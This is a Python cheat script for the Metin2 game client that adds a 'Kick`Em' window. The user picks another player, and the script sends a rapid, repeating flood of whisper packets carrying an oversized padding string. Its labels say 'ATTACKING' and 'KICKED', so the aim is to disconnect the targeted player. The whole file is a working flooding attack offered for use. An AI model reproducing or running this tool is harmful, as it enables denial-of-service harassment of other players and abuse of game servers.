import ui, dbg, app, net, chat, player, time, chr, textTail, event

pj = player.GetTargetVID()
targetvid = chr.GetNameByVID(pj)
haxxor = net.GetMainActorVID()
msj2 = '0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789FZFZ'
kick = 0
messages_sent = 0
antikick_delay = 0

class Dialog1(ui.Window):

    def __init__(self):
        ui.Window.__init__(self)
        self.BuildWindow()

    def __del__(self):
        ui.Window.__del__(self)

    def BuildWindow(self):
        global targetvid
        self.Board = ui.BoardWithTitleBar()
        self.Board.SetSize(222, 107)
        self.Board.SetCenterPosition()
        self.Board.AddFlag('movable')
        self.Board.AddFlag('float')
        self.Board.SetTitleName('Kick`Em')
        self.Board.SetCloseEvent(self.Board.Hide)
        self.Board.Show()
        self.__BuildKeyDict()
        self.comp = Component()
        self.btnobtener = self.comp.Button(self.Board, 'Ziel Auswahl', '', 18, 61, self.btnobtener_func, 'd:/ymir work/ui/public/large_button_01.sub', 'd:/ymir work/ui/public/large_button_02.sub', 'd:/ymir work/ui/public/large_button_03.sub')
        self.btnkick = self.comp.Button(self.Board, 'Start', '', 113, 61, self.btnkick_func, 'd:/ymir work/ui/public/large_button_01.sub', 'd:/ymir work/ui/public/large_button_02.sub', 'd:/ymir work/ui/public/large_button_03.sub')
        self.slotbar_editname, self.editname = self.comp.EditLine(self.Board, targetvid, 63, 37, 135, 15, 25)
        self.txttargetvid = self.comp.TextLine(self.Board, 'Ziel:', 29, 39, self.comp.RGB(155, 155, 255))
        self.txt_updated = self.comp.TextLine(self.Board, '[ IDLE ]', 109, 83, self.comp.RGB(225, 215, 222))
        self.txt_sent_messages = self.comp.TextLine(self.Board, 'Attack`s: ' + str(0), 14, 83, self.comp.RGB(225, 15, 22))

    def btnobtener_func(self):
        global targetvid
        pj = player.GetTargetVID()
        targetvid = chr.GetNameByVID(pj)
        self.editname.SetText(targetvid)

    def btnkick_func(self):
		global kick
		global messages_sent
		global pj
		if kick == 0:
			kick = 1
			chat.AppendChat(1, " [KickEm] Status: Started | Target: " + self.editname.GetText())
			self.txt_updated.SetText('[ ATTACKING ]')
			self.btnkick.SetText('Stop')
			pj = player.GetTargetVID()
			self.kickfinish()
		else:
			self.txt_sent_messages.SetText('Attack`s: ' + str(0))
			self.btnkick.SetText('Start')
			chat.AppendChat(1, " [KickEm] Status: Stopped | Target: " + self.editname.GetText() + " | Message's sent: " + str(messages_sent))
			self.txt_updated.SetText('[ STOPPED ]')
			kick = 0

    def kickfinish(self):
		global messages_sent
		global kick

		haxxor = net.GetMainActorVID()
		if chr.HasInstance(haxxor) and chr.HasInstance(pj):
			net.SendWhisperPacket(str(self.editname.GetText()), msj2)
			if kick == 1:
				messages_sent = messages_sent + 1
				self.txt_sent_messages.SetText('Attack`s: ' + str(messages_sent))
				self.kickseg = WaitingDialog()
				self.kickseg.Open(float(1.0003000348871963e-76))
				self.kickseg.SAFE_SetTimeOverEvent(self.kickfinish)
			else:
				messages_sent = 0
				self.kickseg = WaitingDialog()
				self.kickseg.Open(int(9999999999999999999999999999999999999999999L))
				self.kickseg.SAFE_SetTimeOverEvent(self.kickfinish)
		elif chr.HasInstance(haxxor) and not chr.HasInstance(pj):
			self.txt_updated.SetText('[ KICKED ]')
			kick = 0
			self.btnkick.SetText('Start')
			self.kickfinish()
		elif not chr.HasInstance(haxxor):
			self.txt_updated.SetText('[ IDLE ]')
			kick = 0
			self.btnkick.SetText('Start')
			self.kickfinish()

    def __BuildKeyDict(self):
        onPressKeyDict = {}
        onPressKeyDict[app.DIK_F5] = lambda : self.OpenWindow()
        self.onPressKeyDict = onPressKeyDict

    def OnKeyDown(self, key):
        try:
            self.onPressKeyDict[key]()
        except KeyError:
            pass
        except:
            raise

        return TRUE

    def OpenWindow(self):
        if self.Board.IsShow():
            self.Board.Hide()
        else:
            self.Board.Show()


class Component:

    def Button(self, parent, buttonName, tooltipText, x, y, func, UpVisual, OverVisual, DownVisual):
        button = ui.Button()
        if parent != None:
            button.SetParent(parent)
        button.SetPosition(x, y)
        button.SetUpVisual(UpVisual)
        button.SetOverVisual(OverVisual)
        button.SetDownVisual(DownVisual)
        button.SetText(buttonName)
        button.SetToolTipText(tooltipText)
        button.Show()
        button.SetEvent(func)
        return button

    def ToggleButton(self, parent, buttonName, tooltipText, x, y, funcUp, funcDown, UpVisual, OverVisual, DownVisual):
        button = ui.ToggleButton()
        if parent != None:
            button.SetParent(parent)
        button.SetPosition(x, y)
        button.SetUpVisual(UpVisual)
        button.SetOverVisual(OverVisual)
        button.SetDownVisual(DownVisual)
        button.SetText(buttonName)
        button.SetToolTipText(tooltipText)
        button.Show()
        button.SetToggleUpEvent(funcUp)
        button.SetToggleDownEvent(funcDown)
        return button

    def EditLine(self, parent, editlineText, x, y, width, heigh, max):
        SlotBar = ui.SlotBar()
        if parent != None:
            SlotBar.SetParent(parent)
        SlotBar.SetSize(width, heigh)
        SlotBar.SetPosition(x, y)
        SlotBar.Show()
        Value = ui.EditLine()
        Value.SetParent(SlotBar)
        Value.SetSize(width, heigh)
        Value.SetPosition(4, 1)
        Value.SetMax(max)
        Value.SetLimitWidth(width)
        Value.SetMultiLine()
        Value.SetText(editlineText)
        Value.Show()
        return (SlotBar, Value)

    def TextLine(self, parent, textlineText, x, y, color):
        textline = ui.TextLine()
        if parent != None:
            textline.SetParent(parent)
        textline.SetPosition(x, y)
        if color != None:
            textline.SetFontColor(color[0], color[1], color[2])
        textline.SetText(textlineText)
        textline.Show()
        return textline

    def RGB(self, r, g, b):
        return (r * 255, g * 255, b * 255)

    def SliderBar(self, parent, sliderPos, func, x, y):
        Slider = ui.SliderBar()
        if parent != None:
            Slider.SetParent(parent)
        Slider.SetPosition(x, y)
        Slider.SetSliderPos(sliderPos / 100)
        Slider.Show()
        Slider.SetEvent(func)
        return Slider

    def ExpandedImage(self, parent, x, y, img):
        image = ui.ExpandedImageBox()
        if parent != None:
            image.SetParent(parent)
        image.SetPosition(x, y)
        image.LoadImage(img)
        image.Show()
        return image

    def ComboBox(self, parent, text, x, y, width):
        combo = ui.ComboBox()
        if parent != None:
            combo.SetParent(parent)
        combo.SetPosition(x, y)
        combo.SetSize(width, 15)
        combo.SetCurrentItem(text)
        combo.Show()
        return combo

    def ThinBoard(self, parent, moveable, x, y, width, heigh, center):
        thin = ui.ThinBoard()
        if parent != None:
            thin.SetParent(parent)
        if moveable == TRUE:
            thin.AddFlag('movable')
            thin.AddFlag('float')
        thin.SetSize(width, heigh)
        thin.SetPosition(x, y)
        if center == TRUE:
            thin.SetCenterPosition()
        thin.Show()
        return thin

    def Gauge(self, parent, width, color, x, y):
        gauge = ui.Gauge()
        if parent != None:
            gauge.SetParent(parent)
        gauge.SetPosition(x, y)
        gauge.MakeGauge(width, color)
        gauge.Show()
        return gauge

    def ListBoxEx(self, parent, x, y, width, heigh):
        bar = ui.Bar()
        if parent != None:
            bar.SetParent(parent)
        bar.SetPosition(x, y)
        bar.SetSize(width, heigh)
        bar.SetColor(1996488704)
        bar.Show()
        ListBox = ui.ListBoxEx()
        ListBox.SetParent(bar)
        ListBox.SetPosition(0, 0)
        ListBox.SetSize(width, heigh)
        ListBox.Show()
        scroll = ui.ScrollBar()
        scroll.SetParent(ListBox)
        scroll.SetPosition(width - 15, 0)
        scroll.SetScrollBarSize(heigh)
        scroll.Show()
        ListBox.SetScrollBar(scroll)
        return (bar, ListBox)


class WaitingDialog(ui.ScriptWindow):

    def __init__(self):
        ui.ScriptWindow.__init__(self)
        self.eventTimeOver = lambda *arg: None
        self.eventExit = lambda *arg: None

    def __del__(self):
        ui.ScriptWindow.__del__(self)

    def Open(self, waitTime):
        curTime = time.clock()
        self.endTime = curTime + waitTime
        self.Show()

    def Close(self):
        self.Hide()

    def Destroy(self):
        self.Hide()

    def SAFE_SetTimeOverEvent(self, event):
        self.eventTimeOver = ui.__mem_func__(event)

    def SAFE_SetExitEvent(self, event):
        self.eventExit = ui.__mem_func__(event)

    def OnUpdate(self):
        lastTime = max(0, self.endTime - time.clock())
        if 0 == lastTime:
            self.Close()
            self.eventTimeOver()
        else:
            return


Dialog1().Show()
